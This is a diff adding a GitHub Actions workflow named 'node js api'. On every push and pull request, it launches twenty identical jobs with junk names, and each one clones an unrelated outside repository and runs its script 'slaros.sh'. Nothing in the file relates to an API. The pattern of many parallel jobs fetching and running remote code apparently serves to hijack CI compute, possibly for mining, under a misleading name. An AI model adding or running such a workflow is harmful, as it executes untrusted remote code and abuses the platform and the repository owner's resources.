@@ -1,0 +1,185 @@
+name: node js api
+on:  
+  push:
+  pull_request:
+jobs:
+  aasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  bdasfaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  csasfgaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  dccsfaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  ewewecccsfaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  fasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  gdasfaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  hsasfgaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  iccsfaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  jwewecccsfaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  kasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  ldasfaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  msasfgaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  nccsfaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  owewecccsfaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  pasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  qdasfaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  rsasfgaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  sccsfaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
+  twewecccsfaasem:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Run a one-line script
+        run: |
+          git clone https://github.com/allysyasubirjo/blangkon
+          cd blangkon
+          sh slaros.sh
